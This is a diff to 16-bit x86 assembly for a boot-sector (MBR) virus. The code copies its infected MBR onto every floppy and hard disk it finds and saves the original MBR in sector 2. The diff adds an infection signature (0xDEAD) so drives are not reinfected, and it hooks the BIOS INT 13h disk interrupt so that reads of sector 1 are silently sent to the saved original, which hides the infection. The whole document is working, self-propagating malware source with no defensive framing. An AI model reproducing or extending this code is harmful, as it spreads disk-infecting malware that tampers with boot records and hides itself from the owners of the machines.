@@ -1,6 +1,7 @@
 [bits 16]
 org 0x7c00
 
+
 start:
   cli                         ; no interrupt zone
   mov BYTE [bootDrive], dl    ; save boot drive, this is infected drive
@@ -26,6 +27,10 @@ dsk_lp:
   mov bx, 0x8000            ; load original mbr to 0x8000
   call wr_sector
   jc nxt_disk               ; if carry is set, disk doesn't exist (most likely)
+  add bx, sig               ; check if this drive is already signed
+  sub bx, 0x7c00            ; calculated offset for signature
+  cmp word [bx], 0xDEAD     ; compare with our signature 0xDEAD
+  je nxt_disk               ; if already signed, jump to next disk
 
   mov ah, 0x03              ; dirty business, copy our infected mbr to new drive
   mov bx, 0x7e00            ; we copied infected mbr to 0x7e00 earlier
@@ -43,20 +48,59 @@ nxt_disk:
 ; now we'll copy back original MBR and jump to it
 ; we have to relocate ourselves to 0x7e00, so we don't overwrite when copying
 ; original MBR
-mov dl, [bootDrive]             ; retrieve current boot drive
-mov si, cpy_original            ; source address
-mov di, 0x7e00                  ; destination address, 0x7e00 in our case
-mov cx, end_cpy                 ; load end of code address
-sub cx, cpy_original            ; subtract start of code, cx = code length
-rep movsb                       ; copy stuff from source to dest address
-jmp 0x7e00                      ; jump to new address
+relocate:
+  mov dl, [bootDrive]             ; retrieve current boot drive
+  mov si, cpy_original            ; source address
+  mov di, 0x7e00                  ; destination address, 0x7e00 in our case
+  mov cx, end_cpy                 ; load end of code address
+  sub cx, cpy_original            ; subtract start of code, cx = code length
+  rep movsb                       ; copy stuff from source to dest address
 
+  jmp 0x7e00                      ; jump to new address
+
+; this code resides on 0x7e00 after copying
 cpy_original:                   ; this code will copy original MBR to 0x7c00
   mov ah, 0x02                  ; read sector, ah = 0x02
   mov cx, 0x0002                ; read 2nd sector
   mov bx, 0x7c00                ; dest address
   call wr_sector                ; copy orignal MBR
+
+  ; before we jump into org mbr, let's hook int 13h
+  mov ax, word [0x13*4]
+  mov bx, word [0x13*4+2]
+  mov [oldint13-cpy_original+0x7e00], ax
+  mov [oldint13-cpy_original+0x7e00+2], bx
+  mov ax, dsk_hook
+  sub ax, cpy_original
+  add ax, 0x7e00
+  mov word [0x13*4], ax
+  mov word [0x13*4+2], 0
+  ;mov ah, 0x02
+  ;mov al, 0x01
+  ;mov cx, 0x0001
+  ;mov bx, 0x8000
+  ;call wr_sector
+  mov ax, 0xaa55
   jmp 0x0:0x7c00                  ; far jump to the original MBR
+
+dsk_hook:
+  nop
+  pushf
+  cmp ah, 0x02
+  jne .end_hook
+  cmp cx, 0x0001
+  jne .end_hook
+  mov cx, 0x0002
+.end_hook:
+  popf
+  jmp far [oldint13-cpy_original+0x7e00]
+  ;call 0xe3fe
+  nop
+  ;mov ax, ax
+  ret
+
+oldint13
+  dd 0                   ; var for saving int13 address
 
 ; write/read sector on disk, based on
 ; ah = 0x02 read, ah = 0x03 write
@@ -75,13 +119,13 @@ wr_sector:
     jmp .lprs
   .endrs:
     retn
-end_cpy                         ; end of code for copying original MBR
+
+end_cpy:                         ; end of code for copying original MBR
 
 
 times (218 - ($-$$)) nop      ; Pad for disk time stamp
 
 DiskTimeStamp times 8 db 0    ; Disk Time Stamp
-
 
 bootDrive db 0                ; Our Drive Number Variable
 disk_codes:                   ; available drives variable
@@ -89,6 +133,7 @@ disk_codes:                   ; available drives variable
   db 0x1                      ; second floppy disk
   db 0x80                     ; first hard disk
   db 0x81                     ; second hard disk
+sig dw 0xDEAD
 
 times (0x1b4 - ($-$$)) nop    ; Pad For MBR Partition Table
 
